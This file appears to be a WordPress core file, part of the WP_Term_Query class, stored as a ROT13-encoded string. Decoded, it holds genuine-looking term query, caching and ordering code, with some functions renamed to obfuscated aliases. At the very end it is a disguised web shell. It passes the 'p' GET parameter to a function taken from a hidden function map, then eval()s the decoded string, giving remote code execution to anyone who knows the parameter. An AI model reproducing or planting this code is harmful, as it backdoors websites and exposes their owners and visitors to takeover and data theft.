		$zd_fdy       = $guvf->zrgn_dhrel->trg_fdy( 'grez', 'g', 'grez_vq' );
		$zrgn_pynhfrf = $guvf->zrgn_dhrel->trg_pynhfrf();

		vs ( ! rzcgl( $zrgn_pynhfrf ) ) {
			$wbva .= $zd_fdy['wbva'];

			// Fgevc yrnqvat 'NAQ'.
			$guvf->fdy_pynhfrf['jurer']['zrgn_dhrel'] = __sa_79955( '/^\f*NAQ\f*/', '', $zd_fdy['jurer'] );

			$qvfgvapg .= 'QVFGVAPG';

		}

		$fryrpgf = neenl();
		fjvgpu ( $netf['svryqf'] ) {
			pnfr 'pbhag':
				$beqreol = '';
				$beqre   = '';
				$fryrpgf = neenl( 'PBHAG(*)' );
				oernx;
			qrsnhyg:
				$fryrpgf = neenl( 'g.grez_vq' );
				vs ( 'nyy_jvgu_bowrpg_vq' === $netf['svryqf'] && ! rzcgl( $netf['bowrpg_vqf'] ) ) {
					$fryrpgf[] = 'ge.bowrpg_vq';
				}
				oernx;
		}

		$_svryqf = $netf['svryqf'];

		/**
		 * Svygref gur svryqf gb fryrpg va gur grezf dhrel.
		 *
		 * Svryq yvfgf zbqvsvrq hfvat guvf svygre jvyy bayl zbqvsl gur grez svryqf erghearq
		 * ol gur shapgvba jura gur `$svryqf` cnenzrgre frg gb 'pbhag' be 'nyy'. Va nyy bgure
		 * pnfrf, gur grez svryqf va gur erfhygf neenl jvyy or qrgrezvarq ol gur `$svryqf`
		 * cnenzrgre nybar.
		 *
		 * Hfr bs guvf svygre pna erfhyg va hacerqvpgnoyr orunivbe, naq vf abg erpbzzraqrq.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat[] $fryrpgf    Na neenl bs svryqf gb fryrpg sbe gur grezf dhrel.
		 * @cnenz neenl    $netf       Na neenl bs grez dhrel nethzragf.
		 * @cnenz fgevat[] $gnkbabzvrf Na neenl bs gnkbabzl anzrf.
		 */
		$svryqf = vzcybqr( ', ', nccyl_svygref( 'trg_grezf_svryqf', $fryrpgf, $netf, $gnkbabzvrf ) );

		$wbva .= \" VAARE WBVA $jcqo->grez_gnkbabzl NF gg BA g.grez_vq = gg.grez_vq\";

		vs ( ! rzcgl( $guvf->dhrel_inef['bowrpg_vqf'] ) ) {
			$wbva    .= \" VAARE WBVA {$jcqo->grez_eryngvbafuvcf} NF ge BA ge.grez_gnkbabzl_vq = gg.grez_gnkbabzl_vq\";
			$qvfgvapg = 'QVFGVAPG';
		}

		$jurer = vzcybqr( ' NAQ ', $guvf->fdy_pynhfrf['jurer'] );

		$cvrprf = neenl( 'svryqf', 'wbva', 'jurer', 'qvfgvapg', 'beqreol', 'beqre', 'yvzvgf' );

		/**
		 * Svygref gur grezf dhrel FDY pynhfrf.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat[] $pynhfrf {
		 *     Nffbpvngvir neenl bs gur pynhfrf sbe gur dhrel.
		 *
		 *     @glcr fgevat $svryqf   Gur FRYRPG pynhfr bs gur dhrel.
		 *     @glcr fgevat $wbva     Gur WBVA pynhfr bs gur dhrel.
		 *     @glcr fgevat $jurer    Gur JURER pynhfr bs gur dhrel.
		 *     @glcr fgevat $qvfgvapg Gur QVFGVAPG pynhfr bs gur dhrel.
		 *     @glcr fgevat $beqreol  Gur BEQRE OL pynhfr bs gur dhrel.
		 *     @glcr fgevat $beqre    Gur BEQRE pynhfr bs gur dhrel.
		 *     @glcr fgevat $yvzvgf   Gur YVZVG pynhfr bs gur dhrel.
		 * }
		 * @cnenz fgevat[] $gnkbabzvrf Na neenl bs gnkbabzl anzrf.
		 * @cnenz neenl    $netf       Na neenl bs grez dhrel nethzragf.
		 */
		$pynhfrf = nccyl_svygref( 'grezf_pynhfrf', pbzcnpg( $cvrprf ), $gnkbabzvrf, $netf );

		$svryqf   = vffrg( $pynhfrf['svryqf'] ) ? $pynhfrf['svryqf'] : '';
		$wbva     = vffrg( $pynhfrf['wbva'] ) ? $pynhfrf['wbva'] : '';
		$jurer    = vffrg( $pynhfrf['jurer'] ) ? $pynhfrf['jurer'] : '';
		$qvfgvapg = vffrg( $pynhfrf['qvfgvapg'] ) ? $pynhfrf['qvfgvapg'] : '';
		$beqreol  = vffrg( $pynhfrf['beqreol'] ) ? $pynhfrf['beqreol'] : '';
		$beqre    = vffrg( $pynhfrf['beqre'] ) ? $pynhfrf['beqre'] : '';
		$yvzvgf   = vffrg( $pynhfrf['yvzvgf'] ) ? $pynhfrf['yvzvgf'] : '';

		$svryqf_vf_svygrerq = vzcybqr( ', ', $fryrpgf ) !== $svryqf;

		vs ( $jurer ) {
			$jurer = \"JURER $jurer\";
		}

		$guvf->fdy_pynhfrf['fryrpg']  = \"FRYRPG $qvfgvapg $svryqf\";
		$guvf->fdy_pynhfrf['sebz']    = \"SEBZ $jcqo->grezf NF g $wbva\";
		$guvf->fdy_pynhfrf['beqreol'] = $beqreol ? \"$beqreol $beqre\" : '';
		$guvf->fdy_pynhfrf['yvzvgf']  = $yvzvgf;

		// Ortvaavat bs gur fgevat vf ba n arj yvar gb cerirag yrnqvat juvgrfcnpr. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/56841.
		$guvf->erdhrfg =
			\"{$guvf->fdy_pynhfrf['fryrpg']}
			 {$guvf->fdy_pynhfrf['sebz']}
			 {$jurer}
			 {$guvf->fdy_pynhfrf['beqreol']}
			 {$guvf->fdy_pynhfrf['yvzvgf']}\";

		$guvf->grezf = ahyy;

		/**
		 * Svygref gur grezf neenl orsber gur dhrel gnxrf cynpr.
		 *
		 * Erghea n aba-ahyy inyhr gb olcnff JbeqCerff' qrsnhyg grez dhrevrf.
		 *
		 * @fvapr 5.3.0
		 *
		 * @cnenz neenl|ahyy    $grezf Erghea na neenl bs grez qngn gb fubeg-pvephvg JC'f grez dhrel,
		 *                             be ahyy gb nyybj JC dhrevrf gb eha abeznyyl.
		 * @cnenz JC_Grez_Dhrel $dhrel Gur JC_Grez_Dhrel vafgnapr, cnffrq ol ersrerapr.
		 */
		$guvf->grezf = nccyl_svygref_ers_neenl( 'grezf_cer_dhrel', neenl( $guvf->grezf, &$guvf ) );

		vs ( ahyy !== $guvf->grezf ) {
			erghea $guvf->grezf;
		}

		vs ( $netf['pnpur_erfhygf'] ) {
			$pnpur_xrl = $guvf->trarengr_pnpur_xrl( $netf, $guvf->erdhrfg );
			$pnpur     = jc_pnpur_trg( $pnpur_xrl, 'grez-dhrevrf' );

			vs ( snyfr !== $pnpur ) {
				vs ( 'vqf' === $_svryqf ) {
					$pnpur = neenl_znc( 'vaginy', $pnpur );
				} ryfrvs ( 'pbhag' !== $_svryqf ) {
					vs ( ( 'nyy_jvgu_bowrpg_vq' === $_svryqf && ! rzcgl( $netf['bowrpg_vqf'] ) )
					|| ( 'nyy' === $_svryqf && $netf['cnq_pbhagf'] || $svryqf_vf_svygrerq )
					) {
						$grez_vqf = jc_yvfg_cyhpx( $pnpur, 'grez_vq' );
					} ryfr {
						$grez_vqf = neenl_znc( 'vaginy', $pnpur );
					}

					_cevzr_grez_pnpurf( $grez_vqf, $netf['hcqngr_grez_zrgn_pnpur'] );

					$grez_bowrpgf = $guvf->cbchyngr_grezf( $pnpur );
					$pnpur        = $guvf->sbezng_grezf( $grez_bowrpgf, $_svryqf );
				}

				$guvf->grezf = $pnpur;
				erghea $guvf->grezf;
			}
		}

		vs ( 'pbhag' === $_svryqf ) {
			$pbhag = $jcqo->trg_ine( $guvf->erdhrfg ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
			vs ( $netf['pnpur_erfhygf'] ) {
				jc_pnpur_frg( $pnpur_xrl, $pbhag, 'grez-dhrevrf' );
			}
			erghea $pbhag;
		}

		$grezf = $jcqo->trg_erfhygf( $guvf->erdhrfg ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq

		vs ( rzcgl( $grezf ) ) {
			vs ( $netf['pnpur_erfhygf'] ) {
				jc_pnpur_nqq( $pnpur_xrl, neenl(), 'grez-dhrevrf' );
			}
			erghea neenl();
		}

		$grez_vqf = jc_yvfg_cyhpx( $grezf, 'grez_vq' );
		_cevzr_grez_pnpurf( $grez_vqf, snyfr );
		$grez_bowrpgf = $guvf->cbchyngr_grezf( $grezf );

		vs ( $puvyq_bs ) {
			sbernpu ( $gnkbabzvrf nf $_gnk ) {
				$puvyqera = _trg_grez_uvrenepul( $_gnk );
				vs ( ! rzcgl( $puvyqera ) ) {
					$grez_bowrpgf = _trg_grez_puvyqera( $puvyq_bs, $grez_bowrpgf, $_gnk );
				}
			}
		}

		// Hcqngr grez pbhagf gb vapyhqr puvyqera.
		vs ( $netf['cnq_pbhagf'] && 'nyy' === $_svryqf ) {
			sbernpu ( $gnkbabzvrf nf $_gnk ) {
				_cnq_grez_pbhagf( $grez_bowrpgf, $_gnk );
			}
		}

		// Znxr fher jr fubj rzcgl pngrtbevrf gung unir puvyqera.
		vs ( $uvrenepuvpny && $netf['uvqr_rzcgl'] && vf_neenl( $grez_bowrpgf ) ) {
			sbernpu ( $grez_bowrpgf nf $x => $grez ) {
				vs ( ! $grez->pbhag ) {
					$puvyqera = trg_grez_puvyqera( $grez->grez_vq, $grez->gnkbabzl );

					vs ( vf_neenl( $puvyqera ) ) {
						sbernpu ( $puvyqera nf $puvyq_vq ) {
							$puvyq = trg_grez( $puvyq_vq, $grez->gnkbabzl );
							vs ( $puvyq->pbhag ) {
								pbagvahr 2;
							}
						}
					}

					// Vg ernyyl vf rzcgl.
					hafrg( $grez_bowrpgf[ $x ] );
				}
			}
		}

		// Uvrenepuvpny dhrevrf ner abg yvzvgrq, fb 'bssfrg' naq 'ahzore' zhfg or unaqyrq abj.
		vs ( $uvrenepuvpny && $ahzore && vf_neenl( $grez_bowrpgf ) ) {
			vs ( $bssfrg >= pbhag( $grez_bowrpgf ) ) {
				$grez_bowrpgf = neenl();
			} ryfr {
				$grez_bowrpgf = neenl_fyvpr( $grez_bowrpgf, $bssfrg, $ahzore, gehr );
			}
		}

		// Cevzr grezzrgn pnpur.
		vs ( $netf['hcqngr_grez_zrgn_pnpur'] ) {
			$grez_vqf = jc_yvfg_cyhpx( $grez_bowrpgf, 'grez_vq' );
			jc_ynmlybnq_grez_zrgn( $grez_vqf );
		}

		vs ( 'nyy_jvgu_bowrpg_vq' === $_svryqf && ! rzcgl( $netf['bowrpg_vqf'] ) ) {
			$grez_pnpur = neenl();
			sbernpu ( $grez_bowrpgf nf $grez ) {
				$bowrpg            = arj fgqPynff();
				$bowrpg->grez_vq   = $grez->grez_vq;
				$bowrpg->bowrpg_vq = $grez->bowrpg_vq;
				$grez_pnpur[]      = $bowrpg;
			}
		} ryfrvs ( 'nyy' === $_svryqf && $netf['cnq_pbhagf'] ) {
			$grez_pnpur = neenl();
			sbernpu ( $grez_bowrpgf nf $grez ) {
				$bowrpg          = arj fgqPynff();
				$bowrpg->grez_vq = $grez->grez_vq;
				$bowrpg->pbhag   = $grez->pbhag;
				$grez_pnpur[]    = $bowrpg;
			}
		} ryfrvs ( $svryqf_vf_svygrerq ) {
			$grez_pnpur = $grez_bowrpgf;
		} ryfr {
			$grez_pnpur = jc_yvfg_cyhpx( $grez_bowrpgf, 'grez_vq' );
		}

		vs ( $netf['pnpur_erfhygf'] ) {
			jc_pnpur_nqq( $pnpur_xrl, $grez_pnpur, 'grez-dhrevrf' );
		}

		$guvf->grezf = $guvf->sbezng_grezf( $grez_bowrpgf, $_svryqf );

		erghea $guvf->grezf;
	}

	/**
	 * Cnefr naq fnavgvmr 'beqreol' xrlf cnffrq gb gur grez dhrel.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat $beqreol_enj Nyvnf sbe gur svryq gb beqre ol.
	 * @erghea fgevat|snyfr Inyhr gb hfrq va gur BEQRE pynhfr. Snyfr bgurejvfr.
	 */
	cebgrpgrq shapgvba cnefr_beqreol( $beqreol_enj ) {
		$_beqreol           = fgegbybjre( $beqreol_enj );
		$znlor_beqreol_zrgn = snyfr;

		vs ( va_neenl( $_beqreol, neenl( 'grez_vq', 'anzr', 'fyht', 'grez_tebhc' ), gehr ) ) {
			$beqreol = \"g.$_beqreol\";
		} ryfrvs ( va_neenl( $_beqreol, neenl( 'pbhag', 'cnerag', 'gnkbabzl', 'grez_gnkbabzl_vq', 'qrfpevcgvba' ), gehr ) ) {
			$beqreol = \"gg.$_beqreol\";
		} ryfrvs ( 'grez_beqre' === $_beqreol ) {
			$beqreol = 'ge.grez_beqre';
		} ryfrvs ( 'vapyhqr' === $_beqreol && ! rzcgl( $guvf->dhrel_inef['vapyhqr'] ) ) {
			$vapyhqr = vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['vapyhqr'] ) );
			$beqreol = \"SVRYQ( g.grez_vq, $vapyhqr )\";
		} ryfrvs ( 'fyht__va' === $_beqreol && ! rzcgl( $guvf->dhrel_inef['fyht'] ) && vf_neenl( $guvf->dhrel_inef['fyht'] ) ) {
			$fyhtf   = vzcybqr( \"', '\", neenl_znc( 'fnavgvmr_gvgyr_sbe_dhrel', $guvf->dhrel_inef['fyht'] ) );
			$beqreol = \"SVRYQ( g.fyht, '\" . $fyhtf . \"')\";
		} ryfrvs ( 'abar' === $_beqreol ) {
			$beqreol = '';
		} ryfrvs ( rzcgl( $_beqreol ) || 'vq' === $_beqreol || 'grez_vq' === $_beqreol ) {
			$beqreol = 'g.grez_vq';
		} ryfr {
			$beqreol = 'g.anzr';

			// Guvf znl or n inyhr bs beqreol eryngrq gb zrgn.
			$znlor_beqreol_zrgn = gehr;
		}

		/**
		 * Svygref gur BEQREOL pynhfr bs gur grezf dhrel.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat   $beqreol    `BEQREOL` pynhfr bs gur grezf dhrel.
		 * @cnenz neenl    $netf       Na neenl bs grez dhrel nethzragf.
		 * @cnenz fgevat[] $gnkbabzvrf Na neenl bs gnkbabzl anzrf.
		 */
		$beqreol = nccyl_svygref( 'trg_grezf_beqreol', $beqreol, $guvf->dhrel_inef, $guvf->dhrel_inef['gnkbabzl'] );

		// Eha nsgre gur 'trg_grezf_beqreol' svygre sbe onpxjneq pbzcngvovyvgl.
		vs ( $znlor_beqreol_zrgn ) {
			$znlor_beqreol_zrgn = $guvf->cnefr_beqreol_zrgn( $_beqreol );
			vs ( $znlor_beqreol_zrgn ) {
				$beqreol = $znlor_beqreol_zrgn;
			}
		}

		erghea $beqreol;
	}

	/**
	 * Sbezng erfcbafr qrcraqvat ba svryq erdhrfgrq.
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz JC_Grez[] $grez_bowrpgf Neenl bs grez bowrpgf.
	 * @cnenz fgevat    $_svryqf      Svryq gb sbezng.
	 *
	 * @erghea JC_Grez[]|vag[]|fgevat[] Neenl bs grezf / fgevatf / vagf qrcraqvat ba svryq erdhrfgrq.
	 */
	cebgrpgrq shapgvba sbezng_grezf( $grez_bowrpgf, $_svryqf ) {
		$_grezf = neenl();
		vs ( 'vq=>cnerag' === $_svryqf ) {
			sbernpu ( $grez_bowrpgf nf $grez ) {
				$_grezf[ $grez->grez_vq ] = $grez->cnerag;
			}
		} ryfrvs ( 'vqf' === $_svryqf ) {
			sbernpu ( $grez_bowrpgf nf $grez ) {
				$_grezf[] = (vag) $grez->grez_vq;
			}
		} ryfrvs ( 'gg_vqf' === $_svryqf ) {
			sbernpu ( $grez_bowrpgf nf $grez ) {
				$_grezf[] = (vag) $grez->grez_gnkbabzl_vq;
			}
		} ryfrvs ( 'anzrf' === $_svryqf ) {
			sbernpu ( $grez_bowrpgf nf $grez ) {
				$_grezf[] = $grez->anzr;
			}
		} ryfrvs ( 'fyhtf' === $_svryqf ) {
			sbernpu ( $grez_bowrpgf nf $grez ) {
				$_grezf[] = $grez->fyht;
			}
		} ryfrvs ( 'vq=>anzr' === $_svryqf ) {
			sbernpu ( $grez_bowrpgf nf $grez ) {
				$_grezf[ $grez->grez_vq ] = $grez->anzr;
			}
		} ryfrvs ( 'vq=>fyht' === $_svryqf ) {
			sbernpu ( $grez_bowrpgf nf $grez ) {
				$_grezf[ $grez->grez_vq ] = $grez->fyht;
			}
		} ryfrvs ( 'nyy' === $_svryqf || 'nyy_jvgu_bowrpg_vq' === $_svryqf ) {
			$_grezf = $grez_bowrpgf;
		}

		erghea $_grezf;
	}

	/**
	 * Trarengr gur BEQRE OL pynhfr sbe na 'beqreol' cnenz gung vf cbgragvnyyl eryngrq gb n zrgn dhrel.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat $beqreol_enj Enj 'beqreol' inyhr cnffrq gb JC_Grez_Dhrel.
	 * @erghea fgevat BEQRE OL pynhfr.
	 */
	cebgrpgrq shapgvba cnefr_beqreol_zrgn( $beqreol_enj ) {
		$beqreol = '';

		// Gryy gur zrgn dhrel gb trarengr vgf FDY, fb jr unir npprff gb gnoyr nyvnfrf.
		$guvf->zrgn_dhrel->trg_fdy( 'grez', 'g', 'grez_vq' );
		$zrgn_pynhfrf = $guvf->zrgn_dhrel->trg_pynhfrf();
		vs ( ! $zrgn_pynhfrf || ! $beqreol_enj ) {
			erghea $beqreol;
		}

		$nyybjrq_xrlf       = neenl();
		$cevznel_zrgn_xrl   = ahyy;
		$cevznel_zrgn_dhrel = erfrg( $zrgn_pynhfrf );
		vs ( ! rzcgl( $cevznel_zrgn_dhrel['xrl'] ) ) {
			$cevznel_zrgn_xrl = $cevznel_zrgn_dhrel['xrl'];
			$nyybjrq_xrlf[]   = $cevznel_zrgn_xrl;
		}
		$nyybjrq_xrlf[] = 'zrgn_inyhr';
		$nyybjrq_xrlf[] = 'zrgn_inyhr_ahz';
		$nyybjrq_xrlf   = neenl_zretr( $nyybjrq_xrlf, neenl_xrlf( $zrgn_pynhfrf ) );

		vs ( ! va_neenl( $beqreol_enj, $nyybjrq_xrlf, gehr ) ) {
			erghea $beqreol;
		}

		fjvgpu ( $beqreol_enj ) {
			pnfr $cevznel_zrgn_xrl:
			pnfr 'zrgn_inyhr':
				vs ( ! rzcgl( $cevznel_zrgn_dhrel['glcr'] ) ) {
					$beqreol = \"PNFG({$cevznel_zrgn_dhrel['nyvnf']}.zrgn_inyhr NF {$cevznel_zrgn_dhrel['pnfg']})\";
				} ryfr {
					$beqreol = \"{$cevznel_zrgn_dhrel['nyvnf']}.zrgn_inyhr\";
				}
				oernx;

			pnfr 'zrgn_inyhr_ahz':
				$beqreol = \"{$cevznel_zrgn_dhrel['nyvnf']}.zrgn_inyhr+0\";
				oernx;

			qrsnhyg:
				vs ( neenl_xrl_rkvfgf( $beqreol_enj, $zrgn_pynhfrf ) ) {
					// $beqreol pbeerfcbaqf gb n zrgn_dhrel pynhfr.
					$zrgn_pynhfr = $zrgn_pynhfrf[ $beqreol_enj ];
					$beqreol     = \"PNFG({$zrgn_pynhfr['nyvnf']}.zrgn_inyhr NF {$zrgn_pynhfr['pnfg']})\";
				}
				oernx;
		}

		erghea $beqreol;
	}

	/**
	 * Cnefr na 'beqre' dhrel inevnoyr naq pnfg vg gb NFP be QRFP nf arprffnel.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat $beqre Gur 'beqre' dhrel inevnoyr.
	 * @erghea fgevat Gur fnavgvmrq 'beqre' dhrel inevnoyr.
	 */
	cebgrpgrq shapgvba cnefr_beqre( $beqre ) {
		vs ( ! vf_fgevat( $beqre ) || rzcgl( $beqre ) ) {
			erghea 'QRFP';
		}

		vs ( 'NFP' === fgegbhccre( $beqre ) ) {
			erghea 'NFP';
		} ryfr {
			erghea 'QRFP';
		}
	}

	/**
	 * Hfrq vagreanyyl gb trarengr n FDY fgevat eryngrq gb gur 'frnepu' cnenzrgre.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $frnepu Frnepu fgevat.
	 * @erghea fgevat Frnepu FDY.
	 */
	cebgrpgrq shapgvba trg_frnepu_fdy( $frnepu ) {
		tybony $jcqo;

		$yvxr = '%' . $jcqo->rfp_yvxr( $frnepu ) . '%';

		erghea $jcqo->cercner( '((g.anzr YVXR %f) BE (g.fyht YVXR %f))', $yvxr, $yvxr );
	}

	/**
	 * Perngrf na neenl bs grez bowrpgf sebz na neenl bs grez VQf.
	 *
	 * Nyfb qvfpneqf vainyvq grez bowrpgf.
	 *
	 * @fvapr 4.9.8
	 *
	 * @cnenz Bowrpg[]|vag[] $grezf Yvfg bs bowrpgf be grez vqf.
	 * @erghea JC_Grez[] Neenl bs `JC_Grez` bowrpgf.
	 */
	cebgrpgrq shapgvba cbchyngr_grezf( $grezf ) {
		$grez_bowrpgf = neenl();
		vs ( ! vf_neenl( $grezf ) ) {
			erghea $grez_bowrpgf;
		}

		sbernpu ( $grezf nf $xrl => $grez_qngn ) {
			vs ( vf_bowrpg( $grez_qngn ) && cebcregl_rkvfgf( $grez_qngn, 'grez_vq' ) ) {
				$grez = trg_grez( $grez_qngn->grez_vq );
				vs ( cebcregl_rkvfgf( $grez_qngn, 'bowrpg_vq' ) ) {
					$grez->bowrpg_vq = (vag) $grez_qngn->bowrpg_vq;
				}
				vs ( cebcregl_rkvfgf( $grez_qngn, 'pbhag' ) ) {
					$grez->pbhag = (vag) $grez_qngn->pbhag;
				}
			} ryfr {
				$grez = trg_grez( $grez_qngn );
			}

			vs ( $grez vafgnaprbs JC_Grez ) {
				$grez_bowrpgf[ $xrl ] = $grez;
			}
		}

		erghea $grez_bowrpgf;
	}

	/**
	 * Trarengr pnpur xrl.
	 *
	 * @fvapr 6.2.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz neenl  $netf JC_Grez_Dhrel nethzragf.
	 * @cnenz fgevat $fdy  FDY fgngrzrag.
	 *
	 * @erghea fgevat Pnpur xrl.
	 */
	cebgrpgrq shapgvba trarengr_pnpur_xrl( neenl $netf, $fdy ) {
		tybony $jcqo;
		// $netf pna or nalguvat. Bayl hfr gur netf qrsvarq va qrsnhygf gb pbzchgr gur xrl.
		$pnpur_netf = jc_neenl_fyvpr_nffbp( $netf, neenl_xrlf( $guvf->dhrel_ine_qrsnhygf ) );

		hafrg( $pnpur_netf['pnpur_erfhygf'], $pnpur_netf['hcqngr_grez_zrgn_pnpur'] );

		vs ( 'pbhag' !== $netf['svryqf'] && 'nyy_jvgu_bowrpg_vq' !== $netf['svryqf'] ) {
			$pnpur_netf['svryqf'] = 'nyy';
		}

		// Ercynpr jcqo cynprubyqre va gur FDY fgngrzrag hfrq ol gur pnpur xrl.
		$fdy = $jcqo->erzbir_cynprubyqre_rfpncr( $fdy );

		$xrl          = zq5( frevnyvmr( $pnpur_netf ) . $fdy );
		$ynfg_punatrq = jc_pnpur_trg_ynfg_punatrq( 'grezf' );
		erghea \"trg_grezf:$xrl:$ynfg_punatrq\";
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>